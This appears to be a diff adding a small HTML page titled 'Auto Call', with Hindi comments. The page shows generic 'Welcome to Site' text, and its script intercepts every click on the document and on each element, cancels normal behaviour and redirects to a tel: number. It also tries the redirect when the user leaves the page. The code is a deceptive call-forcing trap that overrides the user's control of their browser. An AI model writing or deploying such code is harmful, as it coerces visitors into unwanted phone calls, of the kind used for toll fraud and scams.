@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Call</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+    <div id="forceCall">
+        <!-- Yahan website content hoga -->
+        <h1>Welcome to Site</h1>
+        <p>Kahi bhi click karo</p>
+    </div>
+
+    <script>
+        // Poore document par click event
+        document.addEventListener('click', function(e) {
+            // Default behavior rok do
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Call trigger karo
+            window.location.href = "tel:+911234567890";
+        }, true); // Capture phase mein hi execute
+
+        // Extra protection - har element par individually
+        document.querySelectorAll('*').forEach(element => {
+            element.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                window.location.href = "tel:+911234567890";
+            }, true);
+        });
+
+        // URL bar ya browser UI ko bhi handle karega
+        window.addEventListener('beforeunload', function() {
+            window.location.href = "tel:+911234567890";
+        });
+    </script>
+</body>
+</html>
